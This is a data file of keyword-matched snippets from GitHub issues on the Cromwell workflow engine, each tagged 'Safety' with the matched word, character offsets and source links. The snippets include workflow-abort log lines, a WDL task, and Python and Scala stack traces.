Abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4018,Abort,Abort,4018,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"atcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17bed42e)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:40,098 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(e9851ba1)]: Abor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4664,Abort,Abort,4664,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"atcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17bed42e)]: Abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4503,Abort,Abort,4503,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"ate_mafs_workflow/1641cccf-e6f1-42fd-9f17-9fd7d355ce3c/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-PK-A5H8-01A-11D-A29I-10.ff872fc4-bd1c-4975-85c8-3655ccd199a2.maf.txt; /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/1641cccf-e6f1-42fd-9f17-9fd7d355ce3c/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-PK-A5H9-01A-11D-A29I-10.ff872fc4-bd1c-4975-85c8-3655ccd199a2.maf.txt; /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/1641cccf-e6f1-42fd-9f17-9fd7d355ce3c/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-PK-A5HA-01A-11D-A29I-10.ff872fc4-bd1c-4975-85c8-3655ccd199a2.maf.txt; /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/1641cccf-e6f1-42fd-9f17-9fd7d355ce3c/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-PK-A5HB-01A-11D-A29I-10.ff872fc4-bd1c-4975-85c8-3655ccd199a2.maf.txt; /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/1641cccf-e6f1-42fd-9f17-9fd7d355ce3c/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-PK-A5HC-01A-11D-A30A-10.ff872fc4-bd1c-4975-85c8-3655ccd199a2.maf.txt; ```. I should also mention that this was in v21, when I attempted in v24, I got a more spectacular failure - `java.lang.UnsupportedOperationException: Could not evaluate expression: ""--maf2 "" + write_lines(maf2)`, and then what appeared to be an infinite loop of the exact same stack trace over and over, which after a standard `ctrl-c` kill became `Waiting for 1 workflows to abort...` over and over again, which finally necessitated a `kill -9`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875:16302,abort,abort,16302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875,1,['abort'],['abort']
Safety,"ave two `write_tsv()` calls in the command block. This code works fine locally. ```; task trim_adapter { # trim adapters and merge trimmed fastqs; 	# parameters from workflow; 	Array[Array[File]] fastqs 		# [merge_id][end_id]; 	Array[Array[String]] adapters 	# [merge_id][end_id]; 	Boolean paired_end; 	# mandatory; 	Boolean auto_detect_adapter		# automatically detect/trim adapters; 	# optional; 	Int? min_trim_len 		# minimum trim length for cutadapt -m; 	Float? err_rate			# Maximum allowed adapter error rate ; 							# for cutadapt -e	; 	# resource; 	Int? cpu; 	Int? mem_mb; 	Int? time_hr; 	String? disks. 	command {; 		python $(which encode_trim_adapter.py) \; 			${write_tsv(fastqs)} \; 			${""--adapters "" + write_tsv(adapters)} \; 			${if paired_end then ""--paired-end"" else """"} \; 			${if auto_detect_adapter then ""--auto-detect-adapter"" else """"} \; 			${""--min-trim-len "" + min_trim_len} \; 			${""--err-rate "" + err_rate} \; 			${""--nth "" + select_first([cpu,4])}; 	}; 	output {; 		# WDL glob() globs in an alphabetical order; 		# so R1 and R2 can be switched, which results in an; 		# unexpected behavior of a workflow; 		# so we prepend merge_fastqs_'end'_ (R1 or R2); 		# to the basename of original filename; 		# this prefix will be later stripped in bowtie2 task; 		Array[File] trimmed_merged_fastqs = glob(""merge_fastqs_R?_*.fastq.gz""); 	}; 	runtime {; 		cpu : select_first([cpu,2]); 		memory : ""${select_first([mem_mb,'10000'])} MB""; 		time : select_first([time_hr,24]); 		disks : select_first([disks,""local-disk 100 HDD""]); 	}; }; ```; with Google JES backend, second call of write_tsv() doesn't seem to correctly pass temporary tsv file into a docker container. `${write_tsv()}` works fine.; `${""some string "" + write_tsv()}` does not work. It still has URI prefix `gs://`. ```; [2017-12-07 13:37:45,35] [info] JesAsyncBackendJobExecutionActor [17f0658fatac.trim_adapter:1:1]: python $(which encode_trim_adapter.py) \; /cromwell_root/atac-seq-pipeline-workflows/ENCSR889WQX/atac/17f",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3032:860,detect,detect-adapter,860,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3032,1,['detect'],['detect-adapter']
Safety,avoid fragile reflection,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/592:0,avoid,avoid,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/592,1,['avoid'],['avoid']
Safety,"ay be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2003,Timeout,TimeoutException,2003,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['Timeout'],['TimeoutException']
Safety,"b/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoProxyWithCleanFailures\n return gce_read.ReadNoProxy(uri)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n: ""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044:2455,timeout,timeout,2455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044,2,['timeout'],['timeout']
Safety,batch abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3753:6,abort,abort,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3753,1,['abort'],['abort']
Safety,bb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatc,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99754,unsafe,unsafeToFuture,99754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
Safety,"borting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3712,Abort,Aborting,3712,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"borting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4358,Abort,Aborting,4358,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"borting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2904,Abort,Aborting,2904,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"borting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3227,Abort,Aborting,3227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"borting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2742,Abort,Aborting,2742,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
